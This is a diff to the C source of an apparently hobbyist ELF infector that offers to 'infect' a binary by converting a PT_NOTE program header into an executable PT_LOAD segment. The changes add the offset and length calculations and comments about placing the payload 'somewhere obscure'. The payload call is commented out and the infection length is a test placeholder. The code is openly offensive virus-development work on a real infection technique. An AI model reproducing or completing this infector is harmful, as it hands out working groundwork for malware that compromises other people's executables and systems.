@@ -16,7 +16,7 @@ void usage(char *program) {
   fprintf(stderr, "Usage: %s [OPTION]... [BINARY]\n\n", program);
   fprintf(stderr, "A tool that can infect or enumerate an ELF binary (sometimes).\n");
   fprintf(stderr, "    -i, --infect        Infect the binary using the PT_NOTE->PT_LOAD method\n");
-  fprintf(stderr, "    -p, --parse         Gather and display information about the target binary\n");
+  fprintf(stderr, "    -p, --parse         Default. Gather and display information about the target binary\n");
   exit(1);
 }
 
@@ -54,59 +54,40 @@ void log_err(char *log) {
 
   change it to avoid standing out.
 */
-void note_to_load(FILE *fp, Elf64_Phdr *new_load) {
-  unsigned int perms = 5; 
+void note_to_load(FILE *fp, Elf64_Phdr *new_load, Elf64_Addr file_offset, Elf64_Addr memory_offset, Elf64_Xword infect_len) {
   unsigned int type = 1;
+  unsigned int perms = 5; 
 
   // This is hackey, but... it works (?)
-  fseek(fp, -56, SEEK_CUR);             // Go back to the beginning of the header we just parsed
-  fwrite(&type, sizeof(type), 1, fp);   // Write the TYPE to the first 4 bytes of the header
-  fwrite(&perms, sizeof(perms), 1, fp); // Write the FLAGS to the second 4 bytes of the header
-  fseek(fp, 8, SEEK_CUR);               // Jump 8 bytes to skip the OFFSET flag (this is already good to go)
-  fwrite(&VADDR, sizeof(VADDR), 1, fp); // Write 8 bytes to the VADDR (where we will jump)
-  fseek(fp, -24, SEEK_CUR);
+  // TODO: find a way to store addresses of the file to structs so we don't have to use seeks to edit binary
+  fseek(fp, -56, SEEK_CUR);
+  fwrite(&type,          sizeof(type),          1, fp); // Change type to LOAD
+  fwrite(&perms,         sizeof(perms),         1, fp); // Set PERMS to R-X (5)
+  fwrite(&file_offset,   sizeof(file_offset),   1, fp); // Move the offset to the very end of file
+  fwrite(&memory_offset, sizeof(memory_offset), 1, fp); // Throw our payload somewhere obscure
+  fwrite(&infect_len,    sizeof(infect_len),    1, fp); // Set the memsz to our infection length
+  fwrite(&infect_len,    sizeof(infect_len),    1, fp); // Set the filesz to our infection length too
+  fseek(fp, -40, SEEK_CUR); // We leave the allign field alone and rewind back to start of header
 
-  parse_program_header(fp, new_load);
+  parse_program_header(fp, new_load); // Throw the new values into the new_load struct
 }
 
 /*
-  Parses the ELF we ingested from the command line.
-*/
-void parse_elf(FILE *fp) {
-  Elf64_Ehdr *ehdr;
-  ehdr = malloc(sizeof(*ehdr));
-
-  parse_elf_header(fp, ehdr); // Parse ELF header
-
-  unsigned short phdr_count = ehdr->e_phnum;
-  Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
-
-  // Parse Program headers
-  for (int i = 0; i < phdr_count; i++) {
-    parse_program_header(fp, &phdr[i]);
-  }
-
-  log_msg("ELF Header");
-  print_elf_header(ehdr);
-  log_msg("Program Headers");
-  for (int i = 0; i < phdr_count; i++) {
-    print_program_header(&phdr[i]);
-  }
-
-  free(ehdr);
-  free(phdr);
-
-  return;
-}
-
-/*
-  Parses the ELF we ingested from the command line.
+  Infects the ELF file.
 */
 void infect_elf(FILE *fp) {
   Elf64_Ehdr *ehdr;
+  ehdr = malloc(sizeof(*ehdr));
+
   int note_count = 0;
 
-  ehdr = malloc(sizeof(*ehdr));
+  // Calculate variables we need
+  fseek(fp, 0L, SEEK_END);
+  Elf64_Addr file_offset = ftell(fp);
+  rewind(fp);
+  Elf64_Addr memory_offset = VADDR + file_offset;
+  Elf64_Xword infect_len = 0x41414141; // Temp value while we run tests
+  
 
   parse_elf_header(fp, ehdr);
 
@@ -137,19 +118,49 @@ void infect_elf(FILE *fp) {
     if (phdr[i].p_type == 4 && note_count == 0) {
       log_msg("Found NOTE!");
       note_count++;
-      note_to_load(fp, new_load);
+      note_to_load(fp, new_load, file_offset, memory_offset, infect_len);
       log_msg("Converted NOTE:");
       print_program_header(&phdr[i]);
       log_msg("To LOAD:");
       print_program_header(new_load);
       log_msg("Attempting to infect now...");
-      infect_the_bloody_elf();
+      //infect_the_bloody_elf();
     }
   }
 
   free(ehdr);
   free(phdr);
   free(new_load);
+
+  return;
+}
+
+/*
+  Parses the ELF we ingested from the command line.
+*/
+void parse_elf(FILE *fp) {
+  Elf64_Ehdr *ehdr;
+  ehdr = malloc(sizeof(*ehdr));
+
+  parse_elf_header(fp, ehdr); // Parse ELF header
+
+  unsigned short phdr_count = ehdr->e_phnum;
+  Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
+
+  // Parse Program headers
+  for (int i = 0; i < phdr_count; i++) {
+    parse_program_header(fp, &phdr[i]);
+  }
+
+  log_msg("ELF Header");
+  print_elf_header(ehdr);
+  log_msg("Program Headers");
+  for (int i = 0; i < phdr_count; i++) {
+    print_program_header(&phdr[i]);
+  }
+
+  free(ehdr);
+  free(phdr);
 
   return;
 }
@@ -237,7 +248,7 @@ int main(int argc, char *argv[]) {
     exit_on_error(fp, fp_err);
   }
 
-  if (parse_flag) {
+  if (parse_flag || !infect_flag) {
     rewind(fp);
     parse_elf(fp);
   }
